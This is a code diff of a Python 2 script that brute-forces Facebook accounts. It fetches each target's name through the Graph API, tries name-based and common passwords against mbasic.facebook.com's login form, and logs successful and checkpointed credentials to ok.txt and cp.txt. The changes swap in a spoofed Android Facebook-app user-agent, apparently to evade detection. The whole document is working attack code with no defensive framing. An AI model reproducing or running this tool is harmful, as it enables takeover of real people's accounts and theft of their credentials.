@@ -444,21 +444,21 @@ def crack1_mbasic(user):
 		a = s.get(api.format('%s?access_token=%s' % (user, toket)), headers=hea).json()
 		dp = a['first_name'].lower()
 		bk = a['last_name'].lower()
-		for password in [dp,dp+'123',dp+'12345','sayang','bismillah','123456','anjing']:
-			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': password, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'})
+		for i in [dp,dp+'123',dp+'12345','sayang','bismillah','123456','anjing']:
+			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\r   [OK] ' +user+ ' | ' +password+                                    ''
-				Successful.append(user+' | '+password)
+				print '\r   [OK] ' +user+ ' | ' +i+I+                                    ''
+				Successful.append(user+' | '+i)
 				save = open('ok.txt','a')
-				save.write(str(user)+' | '+str(password)+'\n')
+				save.write(str(user)+' | '+str(i)+'\n')
 				save.close()
 				break
 			elif 'checkpoint' in xo:
-				print '\r   [CP] ' +user+ ' | ' +password+                                    ''
-				Checkpoint.append(user+' | '+password)
+				print '\r   [CP] ' +user+ ' | ' +i+I+                                    ''
+				Checkpoint.append(user+' | '+i)
 				save = open('cp.txt','a')
-				save.write(str(user)+' | '+str(password)+'\n')
+				save.write(str(user)+' | '+str(i)+'\n')
 				save.close()
 				break
 				
@@ -495,17 +495,17 @@ def cs(user):
 	global loop,pw
 	try:	
 		for i in pw:
-			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'})
+			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\r   [OK] ' +user+ ' | ' +i+                                    ''
+				print '\r   [OK] ' +user+ ' | ' +i+I+                                    ''
 				Successful.append(user+' | '+i)
 				save = open('ok.txt','a')
 				save.write(str(user)+' | '+str(i)+'\n')
 				save.close()
 				break
 			elif 'checkpoint' in xo:
-				print '\r   [CP] ' +user+ ' | ' +i+                                    ''
+				print '\r   [CP] ' +user+ ' | ' +i+I+                                    ''
 				Checkpoint.append(user+' | '+i)
 				save = open('cp.txt','a')
 				save.write(str(user)+' | '+str(i)+'\n')
